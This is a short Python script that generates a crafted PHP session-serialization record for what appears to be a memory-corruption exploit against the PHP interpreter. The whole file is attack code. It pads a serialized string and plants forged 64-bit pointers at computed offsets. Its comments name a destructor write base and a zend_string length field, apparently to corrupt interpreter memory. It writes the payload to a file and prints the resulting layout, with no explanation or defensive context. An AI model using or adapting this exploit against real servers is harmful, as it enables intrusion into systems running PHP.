#!/usr/bin/env python3
import struct,sys

def trunc16(x):
    if x < 0:
        return -((-x)//16)
    return x//16

def build(K_dest,P,total,S,fill=b'S',keylen=None):
    X=K_dest-total-0x1000
    val=X+24
    first=b'S|s:32:"'+fill*32+b'";'
    second=b'J|i:4096;'
    prefix=first+second
    L=total-len(prefix)-len(b'K|s:"')-2
    for _ in range(20):
        hdr=b'K|s:%d:"'%L
        want=total-len(prefix)-len(hdr)-2
        if want==L: break
        L=want
    hdr=b'K|s:%d:"'%L
    raw3=bytearray([0x41])*L
    pbase=len(prefix)+len(hdr)
    file_off=P-val
    b=file_off-pbase
    assert 0<=b and b+0x98<=L,(hex(file_off),b,L,pbase)
    for off,q in ((0,P+56),(8,P+0x88),(16,P+0x88),(24,0),(32,0),(40,0),(48,0x7fffffff),(56,0),(64,0)):
        raw3[b+off:b+off+8]=struct.pack('<Q',q&0xffffffffffffffff)
    # dtor write base is P+0xA0; S+0x10 is zend_string len field
    used=trunc16((S+0x10)-(P+0xA0))
    raw3[b+0x88:b+0x90]=struct.pack('<q',used)
    raw3[b+0x90:b+0x98]=struct.pack('<Q',0)
    rec=prefix+hdr+bytes(raw3)+b'";'
    assert len(rec)==total,(len(rec),total)
    return rec,dict(K_dest=hex(K_dest),X=hex(X),val=hex(val),P=hex(P),S=hex(S),total=len(rec),L=L,used=used,used_hex=hex(used&0xffffffffffffffff))

if __name__=='__main__':
    K=int(sys.argv[1],0); P=int(sys.argv[2],0); total=int(sys.argv[3],0); S=int(sys.argv[4],0); out=sys.argv[5]
    rec,geo=build(K,P,total,S); open(out,'wb').write(rec); print(geo)
